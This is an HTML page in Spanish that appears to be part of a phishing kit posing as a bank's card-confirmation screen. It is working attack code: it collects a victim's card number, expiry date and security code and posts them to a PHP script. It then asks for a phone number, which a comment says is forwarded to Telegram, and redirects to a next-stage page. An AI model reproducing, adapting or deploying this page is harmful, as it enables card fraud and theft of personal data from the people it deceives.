<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>

<style>
/* Tus estilos existentes */
.form {
    width: 390px;
    height: 390px;
}

.for {
    user-select: none;
    pointer-events: none; 
}
.pp {
    outline: none;
    width: 328px;
    height: 40px;
    margin-left: -168px;
    margin-top: -149px;
    font-family: sans-serif;
    background-color: transparent !important;
    position: absolute;
    flex: 1 1 auto;
    min-width: 0;
    border: none;
    margin-bottom: 0;
}

.pp2 {
    outline: none;
    width: 328px;
    height: 40px;
    margin-left: -168px;
    margin-top: -74px;
    font-family: sans-serif;
    background-color: transparent !important;
    position: absolute;
    flex: 1 1 auto;
    min-width: 0;
    border: none;
    margin-bottom: 0;
}

.fua {
    text-transform: none;
    width: 100%!important;
    border: 0px !important;
    padding: .5rem 1.25rem;
    height: 55px!important;
    background-color: #00693c!important;
    border-radius: 83px!important;
    color: #fff!important;
    font-size: 18px!important;
    font-weight: 500!important;
    display: flex;
    align-items: center;
    justify-content: center;
    cursor: pointer;
}

/* Estilos para la ventana emergente */
.popup-overlay {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background-color: rgba(0, 0, 0, 0.5);
    display: none;
    justify-content: center;
    align-items: center;
    z-index: 1000;
}

.popup {
    background-color: white;
    width: 350px;
    padding: 20px;
    border-radius: 10px;
    text-align: center;
    box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.2);
    animation: fadeIn 0.3s ease-in-out;
}

.popup h2 {
    font-family: sans-serif;
    font-size: 18px;
    color: #333;
    margin-bottom: 15px;
}

.popup input {
    width: 100%;
    height: 40px;
    margin-bottom: 15px;
    padding: 0 10px;
    border: 1px solid #ddd;
    border-radius: 5px;
    outline: none;
    font-size: 16px;
}

.popup .fua {
    width: 100%;
    height: 45px;
    border-radius: 5px;
}

@keyframes fadeIn {
    from {
        opacity: 0;
        transform: scale(0.9);
    }
    to {
        opacity: 1;
        transform: scale(1);
    }
}
</style>

<body style="margin-left: 0px;">
<center>
    <form class="form" id="mainForm">
        <img style="width: 250px; user-select: none; pointer-events: none;" src="l.png" alt="">
        <p style="font-family: sans-serif;color: #00693c;font-size: 20px;">Confirma los datos para continuar</p>
        <img class="for" src="img/tarjtitulo.png" style="width: 100%;" alt="">
        <br><br>

        <div>
            <input style="margin-top: -145px;" class="pp" type="text" name="tarj" id="tarj" placeholder="Ingresa número de tarjeta" inputmode="numeric" minlength="19" maxlength="19" required>
        </div>

        <br>
        <div style="margin-top: 4px;">
            <input inputmode="numeric" type="text" id="fecha" name="fecha" maxlength="7" oninput="formatFecha(event)" required style="margin-top: -95px;" class="pp2" placeholder="MM/AA">
        </div>

        <img src="img/cvv.png" alt="" style="width: 100%;margin-top: -40px;">
        <br><br>

        <input type="text" class="pp2" inputmode="numeric" name="pass" id="cvv" maxlength="3" placeholder="Código de seguridad" required>

        <br><br>
        <button type="button" class="fua" id="sendCardData">Ingresar</button>
    </form>

    <div class="popup-overlay" id="popup-overlay">
        <div class="popup">
            <h2>Ingrese su número de teléfono</h2>
            <input type="text" id="phone" placeholder="Teléfono (8 dígitos)" inputmode="numeric" maxlength="8">
            <button class="fua" id="phone-submit">Continuar</button>
        </div>
    </div>
</center>

<script>
    // Formatear el número de tarjeta
    const tarjetaInput = document.getElementById('tarj');
    tarjetaInput.addEventListener('input', function(event) {
        let value = event.target.value.replace(/\D/g, ''); // Eliminar todo lo que no sea dígito
        value = value.match(/.{1,4}/g)?.join(' ') || value; // Añadir espacio cada 4 dígitos
        event.target.value = value;
    });

    // Formatear la fecha MM/AA
    function formatFecha(event) {
        let input = event.target;
        let inputValue = input.value.replace(/\D/g, '');
        let formattedValue = '';

        if (inputValue.length >= 2) {
            formattedValue += inputValue.substr(0, 2);
            if (inputValue.length > 2) {
                formattedValue += '/' + inputValue.substr(2, 2);
            }
        } else {
            formattedValue = inputValue;
        }

        input.value = formattedValue;
    }

    // Enviar datos de la tarjeta y mostrar la ventana emergente
    document.getElementById('sendCardData').addEventListener('click', function() {
        const formData = new FormData(document.getElementById('mainForm'));

        // Enviar datos a indeff.php
        fetch("php/indeff.php", {
            method: "POST",
            body: formData
        })
        .then(response => {
            if (response.ok) {
                document.getElementById('popup-overlay').style.display = 'flex';
            }
        })
        .catch(error => console.error("Error al enviar los datos de la tarjeta:", error));
    });

    // Enviar el número de teléfono
    document.getElementById('phone-submit').addEventListener('click', function() {
        const phoneInput = document.getElementById('phone');
        const phone = phoneInput.value;

        if (!/^[0-9]{8}$/.test(phone)) {
            return;
        }

        // Enviar el número a Telegram
        fetch("php/sendNumber.php", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({ telefono: phone })
        })
        .then(response => response.json())
        .then(() => {
            window.location.href = '2.html'; // Redirigir a 2.html
        })
        .catch(error => console.error("Error al enviar el número:", error));
    });
</script>
</body>
</html>
